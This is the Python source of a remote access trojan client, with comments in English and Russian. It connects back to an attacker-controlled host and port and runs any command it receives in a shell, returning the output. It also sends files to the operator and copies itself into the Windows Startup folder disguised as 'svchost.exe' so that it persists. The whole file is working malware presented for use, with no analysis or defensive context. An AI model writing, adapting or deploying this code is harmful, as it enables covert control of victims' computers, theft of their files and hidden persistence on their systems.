import os
import socket
import subprocess
from time import sleep

# Attacker IP / Айпи атакующего
HOST = 'IP'
# Port to connect / Порт на который клиент будет подключатся
PORT = 9999

s = socket.socket()


# Only for Windows / Только для Windows
def auto_run():
    # Name of the compiled file / Имя скомпилированного файла
    filename = "program54.exe"
    # Windows username/ Имя пользователя Windows
    username = os.getlogin()
    # Path to startup folder / Путь к папке с автозагрузкой
    startup = (r'C:/Users/' + username + r'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')

    # Check if file already exist / Проверка существует ли файл
    if os.path.exists(str(startup + r'svchost.exe')) == True:
        # Sending message / Отправляем сообщение
        s.send(bytes("\nRAT already at startup folder\n", encoding="utf-8", errors="ignore"))
    else:
        os.system("copy " + filename + " " + '"' + startup + '"' + r'svchost.exe')
        # Sending message / Отправляем сообщение
        s.send(bytes("\nRAT added at startup folder\n", encoding="utf-8", errors="ignore"))


# Connect function / Функция подключения
def main():
    try:
        s.connect((HOST, PORT))
        session()
    except:
        sleep(500)
        s.connect((HOST, PORT))
        session()


# Command processor / Обработчик команд
def session():
    while True:
        data = s.recv(1024)
        cmd = str(data, encoding="utf-8", errors="ignore")

        if cmd == 'shutdownrat':
            s.close()
            exit(0)

        # AUTORUN (Only for Windows / Только для Windows)
        elif cmd == "autorun":
            auto_run()

        # GETFILE
        elif cmd == "getfile":
            try:
                # Get file name to send / Имя файла для отправки
                file_to_send = "FILENAME"
                # Open file / Открытие файла
                f = open(file_to_send, "rb")
                # Send file / Отправка файла
                data_to_send = f.read()
                s.send(data_to_send)
                f.close()
                s.send(bytes("\nFile has been sent\n" + "\n", encoding="utf-8", errors="ignore"))
            except Exception as ex:
                s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))

        # CD
        elif cmd[:2] == "cd":
            try:
                # Send command arguments to os.chdir / Отправка аргументов команды в os.chdir
                os.chdir(data[3:])
                pwd = os.getcwd()
                s.send(bytes(pwd, encoding="utf-8", errors="ignore"))
            except Exception as ex:
                s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))

        # PWD
        elif cmd == "pwd":
            try:
                # Variable with current directory / Переменная с текущей директорией
                pwd = os.getcwd()
                s.send(bytes(pwd, encoding="utf-8", errors="ignore"))
            except Exception as ex:
                s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))

        # If length of command > 0, send to subprocess shell / Если длина команды > 0, посылаем ее в консоль subprocess
        elif len(cmd) > 0:
            try:
                command = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                           stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                # Variable with subprocess output / Переменная с ответом от subprocess
                output_byte = command.stdout.read() + command.stderr.read()
                # Convert output_byte to string / Конвертируем output_byte в строку
                output_str = str(output_byte, "utf-8", errors="ignore")
                # Sending output_str to server / Отправляем output_str на сервер
                s.send(bytes(output_str, encoding="utf-8", errors="ignore"))
            except Exception as ex:
                s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))


if __name__ == '__main__':
    main()
